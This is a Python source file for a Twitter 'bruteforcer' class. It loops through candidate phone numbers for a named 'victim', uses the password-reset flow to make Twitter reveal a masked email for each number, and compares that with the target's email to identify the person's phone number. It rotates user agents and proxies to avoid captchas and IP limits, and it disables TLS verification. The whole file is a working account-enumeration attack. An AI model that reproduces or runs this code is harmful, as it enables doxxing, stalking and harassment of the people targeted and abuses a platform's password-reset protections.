import logging
import requests
import re
from bruteforcers import Bruteforcer


class Twitter(Bruteforcer):
    logger = logging.getLogger(__name__)

    def bruteforce(self):

        self.logger.info("Using Twitter to find victim's phone number...")

        possible_number_found = False

        for phoneNumber in self.possible_phone_numbers:
            user_agent = self.user_agents_instance.next()  # Pick random user agents to help prevent captchas
            proxy = self.proxy_instance.get_random_proxy()

            session = requests.Session()
            response = session.get("https://twitter.com/account/begin_password_reset",
                                   headers={"Accept": "application/json, text/javascript, */*; q=0.01",
                                            "X-Push-State-Request": "true",
                                            "X-Requested-With": "XMLHttpRequest",
                                            "X-Twitter-Active-User": "yes",
                                            "User-Agent": user_agent,
                                            "X-Asset-Version": "5bced1",
                                            "Referer": "https://twitter.com/login",
                                            "Accept-Encoding": "gzip, deflate",
                                            "Accept-Language": "en-US,en;q=0.9"
                                            },
                                   proxies=proxy,
                                   verify=False)

            regex_output = re.search('authenticity_token.+value="(\w+)">', response.text)
            authenticity_token = regex_output.group(1) if regex_output and regex_output.group(1) else ""
            if not authenticity_token:
                self.logger.warning(self.colors.YELLOW + "Twitter did not display a masked email for number: " + phoneNumber + self.colors.ENDC)
                continue

            response = session.post("https://twitter.com/account/begin_password_reset",
                                    headers={"Cache-Control": "max-age=0",
                                             "Origin": "https://twitter.com",
                                             "Upgrade-Insecure-Requests": "1",
                                             "Content-Type": "application/x-www-form-urlencoded",
                                             "User-Agent": user_agent,
                                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                             "Referer": "https://twitter.com/account/begin_password_reset",
                                             "Accept-Encoding": "gzip, deflate",
                                             "Accept-Language": "en-US,en;q=0.9"
                                             },
                                    data="authenticity_token=" + authenticity_token +
                                         "&account_identifier=" + phoneNumber,
                                    allow_redirects=False,
                                    proxies=proxy,
                                    verify=False)

            if "Location" in response.headers and response.headers['Location'] == "https://twitter.com/account/password_reset_help?c=4":
                self.logger.error(
                    self.colors.RED + "Twitter reports MAX attemtps reached. Need to change IP. It happened while trying phone " + phoneNumber + self.colors.ENDC)
                continue

            response = session.get("https://twitter.com/account/send_password_reset",
                                   headers={"Cache-Control": "max-age=0",
                                            "Upgrade-Insecure-Requests": "1",
                                            "User-Agent": user_agent,
                                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                                            "Referer": "https://twitter.com/account/begin_password_reset",
                                            "Accept-Encoding": "gzip, deflate",
                                            "Accept-Language": "en-US,en;q=0.9"
                                            },
                                   proxies=proxy,
                                   verify=False)

            regex_output = re.search('<strong .+>([a-zA-Z]+\*+@[a-zA-Z\*\.]+)<\/strong>', response.text)
            if regex_output and regex_output.group(1):
                masked_email = regex_output.group(1)
                if len(self.email) == len(masked_email) and self.email[0] == masked_email[0] and self.email[1] == \
                        masked_email[1] and self.email[
                                           self.email.find('@') + 1: self.email.find('@') + 2] == masked_email[
                                                                                                    masked_email.find(
                                                                                                        '@') + 1: masked_email.find(
                                                                                                        '@') + 2]:
                    print(
                        self.colors.GREEN + "Twitter found that the possible phone number for " + self.email + " is: " + phoneNumber + self.colors.ENDC)
                    possible_number_found = True
                else:
                    self.logger.warning(self.colors.YELLOW + "Twitter did not find a match for email: " + masked_email + " and number: " + phoneNumber + self.colors.ENDC)
            else:
                self.logger.warning(self.colors.YELLOW + "Twitter did not display a masked email for number: " + phoneNumber + self.colors.ENDC)
                continue

        if not possible_number_found:
            self.logger.error(self.colors.RED + "Couldn't find a phone number associated to " + self.email + self.colors.ENDC)
